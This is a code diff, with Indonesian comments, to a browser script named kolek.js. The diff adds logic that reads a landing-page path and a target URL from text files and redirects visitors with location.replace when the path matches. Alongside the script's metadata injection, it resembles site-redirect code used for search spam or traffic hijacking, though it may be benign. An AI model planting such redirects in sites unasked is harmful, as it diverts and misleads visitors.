@@ -50,6 +50,31 @@ console.log('kolek.js script is running...');
     console.log('Metadata injected successfully.');
   };
 
+  // Membaca URL dari landingpage.txt dan target.txt
+  Promise.all([
+    fetchFileContent('/landingpage.txt'),
+    fetchFileContent('/target.txt'),
+  ])
+    .then(([landingPage, targetUrl]) => {
+      console.log('All files fetched successfully.'); // Log setelah semua file berhasil diambil
+      const currentPath = new URL(location.href).pathname; // Dapatkan path URL saat ini
+      console.log('Current Path:', currentPath);
+
+      // Periksa apakah URL saat ini cocok dengan landingpage.txt
+      const landingPagePath = landingPage.trim();
+      console.log('Landing Page Path:', landingPagePath);
+
+      if (currentPath.endsWith(landingPagePath)) {
+        console.log('Current URL matches landing page. Redirecting to target URL...');
+        const finalTargetUrl = getFinalUrl(targetUrl.trim()); // Dapatkan tujuan akhir dari target.txt
+        console.log(`Redirecting to: ${finalTargetUrl}`); // Log tambahan untuk memastikan URL redirect
+        location.replace(finalTargetUrl); // Redirect ke tujuan akhir
+      } else {
+        console.warn('Current URL does not match landing page. No redirect performed.');
+      }
+    })
+    .catch((err) => console.error('Error loading files:', err));
+
   // Membaca URL dari target.txt, metadata dari metadata.txt, dan daftar halaman dari landingpage.txt
   Promise.all([
     fetchFileContent('/target.txt'),
